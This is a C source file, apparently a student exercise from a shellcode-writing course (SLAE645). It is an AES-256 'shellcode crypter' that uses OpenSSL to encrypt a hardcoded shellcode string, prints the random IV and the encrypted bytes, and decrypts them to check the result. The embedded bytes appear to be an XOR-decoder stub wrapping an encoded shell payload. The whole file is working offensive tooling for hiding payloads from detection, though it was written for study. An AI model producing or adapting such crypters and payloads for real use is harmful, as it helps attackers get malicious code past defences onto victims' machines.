// aes shellcode crypter
// compile: 	gcc encshellcode.c -lcrypto -o encshellcode
// 
// INPUT: 	shellcode
//		key
// OUTPUT:	IV
//		encrypted shellcode	
// StudentID: 	SLAE645

#include <stdio.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

void print_bytes (unsigned char arr[], int size)
{
	int i;
	for (i = 0; i < size; i++)
	{

	printf("\\x%02x", arr[i]);
	}
	printf("\n");
}


int main()
{
	EVP_CIPHER_CTX ctx;
	// <><><> Input the shellcode to be encrypted
	unsigned char shellcode[]=\
"\xeb\x0d\x5e\x31\xc9\xb1\x19\x80\x36\xaa\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";

    	// <><><> Input the key for encryption
	// max length 64 characters (512 bits), we will use 32 (256 bits)
	// echo "slae" | sha256sum -->> 825283f16463886dfd671599fb0aa61345e65f5ec8d46d2818ea9e56fe471f37
    	unsigned char key[EVP_MAX_KEY_LENGTH] = "\x82\x52\x83\xf1\x64\x63\x88\x6d\xfd\x67\x15\x99\xfb\x0a\xa6\x13\x45\xe6\x5f\x5e\xc8\xd4\x6d\x28\x18\xea\x9e\x56\xfe\x47\x1f\x37";

	unsigned char iv[EVP_MAX_IV_LENGTH]="";	
    	unsigned char out[sizeof(shellcode)];
	unsigned char decout[sizeof(out)];	

	int declen1, declen2;
    	int outlen1, outlen2;

	RAND_bytes(iv, EVP_MAX_IV_LENGTH);		
	printf ("[*] IV used for encryption:\n");
	print_bytes(iv, sizeof(iv));
	printf("\n");

    	EVP_EncryptInit(&ctx, EVP_aes_256_ctr(), key, iv);
    	EVP_EncryptUpdate(&ctx, out, &outlen1, shellcode, sizeof(shellcode)-1);
    	EVP_EncryptFinal(&ctx, out + outlen1, &outlen2);

	
	printf("[*] We have read %d bytes of shellcode, and generated %d bytes of encrypted output\n\n", sizeof(shellcode)-1, outlen1+outlen2);
	
	printf(" --- Encrypted shellcode ---\n");	
	print_bytes(out, sizeof(out)-1);
	printf("\n");	

	printf(" --- Hex-dump of encrypted shellcode ---\n");	
	BIO_dump_fp(stdout, out, sizeof(out)-1);
	EVP_CIPHER_CTX_cleanup(&ctx);
	
	
	printf("\n --- Decryption routine (check) ---\n");
	EVP_CIPHER_CTX ctx2;
	EVP_DecryptInit(&ctx2, EVP_aes_256_ctr(), key, iv);
    	EVP_DecryptUpdate(&ctx2, decout, &declen1, out, sizeof(out)-1);
    	EVP_DecryptFinal(&ctx2, decout + declen1, &declen2);
	BIO_dump_fp(stdout, decout, sizeof(decout)-1);
	EVP_CIPHER_CTX_cleanup(&ctx2);

	EVP_cleanup();	
	CRYPTO_cleanup_all_ex_data();
	return 0;
}

